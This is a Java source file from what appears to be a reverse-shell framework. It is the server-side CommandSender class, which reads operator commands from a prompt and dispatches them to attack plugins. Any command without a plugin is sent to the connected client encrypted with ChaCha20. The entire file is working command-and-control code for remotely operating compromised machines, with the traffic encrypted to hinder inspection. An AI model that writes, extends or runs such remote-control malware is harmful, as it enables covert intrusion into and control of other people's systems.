package obs1d1anc1ph3r.reverseshell.server.commandhandling;

import obs1d1anc1ph3r.reverseshell.client.encryption.ChaCha20;

import java.io.*;
import java.util.logging.Level;
import java.util.logging.Logger;
import obs1d1anc1ph3r.reverseshell.server.plugins.proactive.ProactiveCommandPlugin;
import obs1d1anc1ph3r.reverseshell.server.plugins.proactive.ProactivePluginManager;

public class CommandSender implements Runnable {

	private static final Logger logger = Logger.getLogger(CommandSender.class.getName());
	private final DataOutputStream dataOut;
	private final BufferedReader userInput;
	private final byte[] encryptionKey;
	private final ProactivePluginManager proactivePluginManager;

	public CommandSender(DataOutputStream dataOut, BufferedReader userInput, byte[] encryptionKey, byte[] nonce) {
		this.dataOut = dataOut;
		this.userInput = userInput;
		this.encryptionKey = encryptionKey;
		this.proactivePluginManager = new ProactivePluginManager();
	}

	@Override
	public void run() {
		try {
			handleUserInput();
		} catch (IOException e) {
			logger.log(Level.SEVERE, "[ERROR] Error reading command input: " + e.getMessage(), e);
		} catch (Exception ex) {
			logger.log(Level.SEVERE, "[ERROR] Unexpected error: ", ex);
		} finally {
			cleanup();
		}
	}

	private void handleUserInput() throws IOException, Exception {
		System.out.print("\nCommand> "); // First prompt
		while (true) {
			String command = userInput.readLine();
			if (command == null) {
				return;
			}

			CheckForPlugin(command);
		}
	}

	public void CheckForPlugin(String command) throws Exception {
		String baseCommand = command.split(" ")[0].toLowerCase();
		ProactiveCommandPlugin proactive = proactivePluginManager.getPluginProactive(baseCommand);
		executePlugin(proactive, command);

	}

	public void executePlugin(ProactiveCommandPlugin proactive, String command) {
		try {
			proactive.execute(dataOut, encryptionKey, this, command);
		} catch (Exception ex) {
			sendCommand(command);
		}
	}

	public void sendCommand(String command) {
		if (dataOut == null) {
			logger.severe("[ERROR] Output stream is closed. Unable to send command.");
			return;
		}

		try {
			byte[] nonce = ChaCha20.generateNonce();
			byte[] encryptedCommand = ChaCha20.encrypt(encryptionKey, nonce, command.getBytes());

			dataOut.writeInt(nonce.length + encryptedCommand.length);
			dataOut.write(nonce);
			dataOut.write(encryptedCommand);
			dataOut.flush();
		} catch (IOException e) {
			logger.log(Level.SEVERE, "[ERROR] Error sending command: " + e.getMessage(), e);
		} catch (Exception ex) {
			logger.log(Level.SEVERE, "[ERROR] Encryption error: ", ex);
		}
	}

	public void cleanup() {
		try {
			if (dataOut != null) {
				dataOut.close();
				//logger.info("[-] Output stream closed.");
			}
		} catch (IOException e) {
			logger.log(Level.SEVERE, "[ERROR] Error during cleanup: " + e.getMessage(), e);
		}
	}
}
